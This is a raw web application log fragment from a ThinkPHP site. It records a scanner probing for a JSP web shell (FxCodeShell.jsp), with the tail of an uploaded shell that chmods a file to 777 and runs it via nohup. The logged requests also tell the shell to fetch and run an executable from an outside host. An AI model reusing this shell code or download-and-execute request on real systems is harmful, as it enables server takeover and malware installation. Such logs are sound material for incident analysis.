				String chmod = "chmod 777 "   path   fileName;
				exec.exec(chmod);
				exec.exec("nohup "   path   fileName   " > /dev/null 2>',
  '");
			}
		}_catch_(Exception_e2)_{
			e2_printStackTrace();
		}
	}
%>' => '',
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000101s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-03-31T23:43:26+08:00 ] 47.92.83.243 GET 47.92.113.32/FxCodeShell.jsp/
[运行时间：0.019564s] [吞吐率：51.11req/s] [内存消耗：2,154.02kb] [文件加载：61]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000020s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001774s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001789s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '404',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.92.113.32',
  'content-length' => '3363',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://47.92.113.32:443/FxCodeShell.jsp/',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'content-type' => 'text/plain; Charset=UTF-8',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000123s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-03-31T23:43:26+08:00 ] 47.92.83.243 GET 47.92.113.32/FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe
[运行时间：0.039084s] [吞吐率：25.59req/s] [内存消耗：2,146.85kb] [文件加载：61]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000022s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.002130s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002148s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'FxCodeShell.jsp',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.92.113.32',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://47.92.113.32:443/FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'connection' => 'Keep-Alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'view' => 'FxxkMyLie1836710Aa',
  'os' => '1',
  'address' => 'http://fid.hognoob.se/download.exe',
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000101s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-03-31T23:43:26+08:00 ] 47.92.83.243 GET 47.92.113.32/FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe
[运行时间：0.020817s] [吞吐率：48.04req/s] [内存消耗：2,145.91kb] [文件加载：61]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000025s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001882s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001900s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '404',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.92.113.32',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://47.92.113.32:443/FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'connection' => 'Keep-Alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000112s ]
[ info ] [ LOG ] INIT File
